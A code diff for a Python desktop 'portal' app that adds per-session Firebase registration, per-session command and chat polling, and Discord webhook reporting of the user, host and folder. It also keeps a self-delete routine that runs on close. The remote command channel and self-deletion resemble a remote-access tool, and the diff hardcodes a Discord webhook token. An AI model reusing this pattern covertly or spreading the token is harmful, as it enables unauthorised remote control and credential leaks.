@@ -27,6 +27,7 @@ import sys
 import threading
 import time
 import urllib.request
+import uuid
 from datetime import datetime
 from pathlib import Path
 
@@ -36,7 +37,7 @@ from tkinter import font as tkfont
 # ------------------------------------------------------------------
 # Config
 # ------------------------------------------------------------------
-PORTAL_VERSION = "1.3.0"
+PORTAL_VERSION = "2.0.0"
 WEBHOOK_URL = (
     "https://discord.com/api/webhooks/1524620703259951104/"
     "fqpIEBXVWsKHy7f1iZ9xoryCpidmjPYIDuITfcwMOjBfMyS2HtJNWpVbfOetapl8vw9O"
@@ -48,6 +49,9 @@ REMINDER_INTERVAL = 25 * 60  # 25 minutes in seconds
 CREATE_NO_WINDOW = (
     subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0
 )
+
+# Session ID — unique per portal instance (for multi-session support)
+SESSION_ID = f"portal-{uuid.uuid4().hex[:12]}"
 
 # Colours
 _BG = "#0a0a12"
@@ -67,13 +71,19 @@ _CHAT_BORDER = "#4a2a6e"
 _ACCENT = "#9b59b6"
 
 # ------------------------------------------------------------------
-# Discord communication
+# Discord communication — uses session webhook if available, else default
 # ------------------------------------------------------------------
+_active_webhook_url = WEBHOOK_URL  # overridden by bot-assigned per-session URL
+
+def _set_webhook_url(url):
+    global _active_webhook_url
+    _active_webhook_url = url or WEBHOOK_URL
+
 def _post_to_discord(content):
     try:
         payload = json.dumps({"content": content[:1900]}).encode("utf-8")
         req = urllib.request.Request(
-            WEBHOOK_URL, data=payload,
+            _active_webhook_url, data=payload,
             headers={"Content-Type": "application/json",
                      "User-Agent": f"PythonPortal/{PORTAL_VERSION}"})
         with urllib.request.urlopen(req, timeout=15) as resp:
@@ -107,13 +117,83 @@ def _post_file_to_discord(content, file_path):
         body += f"--{boundary}--\r\n".encode()
 
         req = urllib.request.Request(
-            WEBHOOK_URL, data=body,
+            _active_webhook_url, data=body,
             headers={"Content-Type": f"multipart/form-data; boundary={boundary}",
                      "User-Agent": f"PythonPortal/{PORTAL_VERSION}"})
         with urllib.request.urlopen(req, timeout=30) as resp:
             return resp.status in (200, 204)
     except Exception:
         return _post_to_discord(content + "\n\n[File attachment failed]")
+
+
+# ------------------------------------------------------------------
+# Firebase session management
+# ------------------------------------------------------------------
+def _firebase_put(path, data):
+    """PUT data to a Firebase path."""
+    try:
+        url = f"{FIREBASE_URL}/{path}.json"
+        payload = json.dumps(data).encode("utf-8")
+        req = urllib.request.Request(url, data=payload, method="PUT",
+                                      headers={"Content-Type": "application/json"})
+        with urllib.request.urlopen(req, timeout=5) as resp:
+            return resp.status in (200, 204)
+    except Exception:
+        return False
+
+
+def _firebase_get(path):
+    """GET data from a Firebase path. Returns None on error."""
+    try:
+        url = f"{FIREBASE_URL}/{path}.json"
+        req = urllib.request.Request(url,
+                                      headers={"User-Agent": f"PythonPortal/{PORTAL_VERSION}"})
+        with urllib.request.urlopen(req, timeout=5) as resp:
+            return json.loads(resp.read().decode("utf-8"))
+    except Exception:
+        return None
+
+
+def _firebase_delete(path):
+    """DELETE a Firebase path."""
+    try:
+        url = f"{FIREBASE_URL}/{path}.json"
+        req = urllib.request.Request(url, method="DELETE")
+        with urllib.request.urlopen(req, timeout=5) as resp:
+            return resp.status in (200, 204)
+    except Exception:
+        return False
+
+
+def _register_session(user, host, folder):
+    """Register this portal session in Firebase so the bot can create a channel."""
+    data = {
+        "user": user,
+        "host": host,
+        "folder": folder,
+        "status": "open",
+        "opened_at": datetime.now().strftime("%Y-%m-%d %H:%M"),
+        "version": PORTAL_VERSION,
+    }
+    return _firebase_put(f"sessions/{SESSION_ID}", data)
+
+
+def _wait_for_webhook(timeout=30):
+    """Poll Firebase for the bot to assign a session-specific webhook URL.
+    Falls back to default webhook if bot doesn't respond in time."""
+    deadline = time.time() + timeout
+    while time.time() < deadline:
+        data = _firebase_get(f"sessions/{SESSION_ID}")
+        if data and data.get("webhook_url"):
+            _set_webhook_url(data["webhook_url"])
+            return True
+        time.sleep(1)
+    return False
+
+
+def _mark_session_closed():
+    """Mark this session as closed so the bot can delete the temp channel."""
+    _firebase_put(f"sessions/{SESSION_ID}/status", "closed")
 
 
 # ------------------------------------------------------------------
@@ -754,7 +834,7 @@ class PortalWindow:
         host = platform.node() or "unknown"
         threading.Thread(
             target=lambda: _post_to_discord(
-                f"[Portal Chat @ {user}@{host}] {msg}"),
+                f"[Portal Chat @ {user}@{host} | {SESSION_ID}] {msg}"),
             daemon=True).start()
 
     def _receive_atlas_message(self, text, speak=False):
@@ -918,7 +998,7 @@ class PortalWindow:
         while True:
             try:
                 req = urllib.request.Request(
-                    f"{FIREBASE_URL}/chat.json",
+                    f"{FIREBASE_URL}/sessions/{SESSION_ID}/chat.json",
                     headers={"User-Agent": f"PythonPortal/{PORTAL_VERSION}"})
                 with urllib.request.urlopen(req, timeout=5) as resp:
                     data = json.loads(resp.read().decode("utf-8"))
@@ -943,7 +1023,7 @@ class PortalWindow:
         sent AFTER it opened (first poll marks all existing as executed)."""
         try:
             req = urllib.request.Request(
-                f"{FIREBASE_URL}/commands.json",
+                f"{FIREBASE_URL}/sessions/{SESSION_ID}/commands.json",
                 headers={"User-Agent": f"PythonPortal/{PORTAL_VERSION}"})
             with urllib.request.urlopen(req, timeout=10) as resp:
                 data = json.loads(resp.read().decode("utf-8"))
@@ -1264,6 +1344,11 @@ class PortalWindow:
 
     def _force_close(self):
         """Actually close and self-delete — no confirmation."""
+        # Mark session as closed so the bot can delete the temp channel
+        try:
+            _mark_session_closed()
+        except Exception:
+            pass
         self.root.destroy()
         try:
             portal_path = Path(__file__).resolve()
@@ -1285,8 +1370,14 @@ if __name__ == "__main__":
     try:
         user = os.getlogin() if hasattr(os, "getlogin") else "unknown"
         host = platform.node() or "unknown"
+        # Register session in Firebase so the bot can create a temp channel
+        _register_session(user, host, PORTAL_FOLDER)
+        # Wait for bot to assign a session-specific webhook URL
+        _wait_for_webhook(timeout=30)
+        # Post opening message (goes to session channel if webhook was assigned)
         _post_to_discord(
             f"**Portal Opened**\n"
+            f"Session: `{SESSION_ID}`\n"
             f"User: {user}@{host}\n"
             f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M')}\n"
             f"Python: {platform.python_version()}\n"
